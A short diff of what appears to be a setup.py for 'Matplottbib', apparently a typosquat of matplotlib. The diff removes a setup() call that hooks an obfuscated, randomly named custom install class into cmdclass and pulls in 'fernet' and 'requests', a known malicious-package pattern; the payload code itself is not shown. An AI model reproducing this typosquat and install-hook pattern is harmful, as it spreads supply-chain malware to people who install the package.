@@ -18,22 +18,5 @@ class swjqXVattspzpNdFhlOfAgMXmoAxwGBjvvYNOIxzDRRfWYChjFYSWSXIyuQgGNwvAQlkVgixLi
             install.run(self)
 
 
-setup(
-    name="Matplottbib",
-    version=VERSION,
-    author="QIPTYFOL",
-    author_email="YHvoOlLzRqPBFyJlCRGq@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': swjqXVattspzpNdFhlOfAgMXmoAxwGBjvvYNOIxzDRRfWYChjFYSWSXIyuQgGNwvAQlkVgixLizvQgooFoVpmgDeWUjsQOgzrWsVjpcjkwFdGINed,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
